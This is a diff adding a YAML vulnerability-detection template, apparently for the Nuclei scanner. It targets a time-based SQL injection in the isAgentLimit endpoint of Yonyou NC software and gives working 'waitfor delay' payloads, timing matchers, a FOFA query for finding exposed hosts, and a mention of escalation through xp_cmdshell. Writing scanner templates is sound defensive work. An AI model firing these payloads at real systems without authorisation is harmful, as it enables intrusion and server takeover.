@@ -1,0 +1,37 @@
+id: yongyouNC-isAgentLimit-sql-injection
+
+info:
+  name: 用友NC oacoSchedulerEvents/isAgentLimit SQL注入漏洞
+  author: unknown
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+    用友NC /portal/pt/oacoSchedulerEvents/isAgentimit接口中的pk_fowagent参数存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshel可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/139638451
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:3'-- HTTP/1.1 
+        Host: {{Hostname}}
+
+      - |
+        GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+            - 'duration_1>=3 && duration_1<=4'  
+            - 'duration_2>=6 && duration_2<=7'  
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
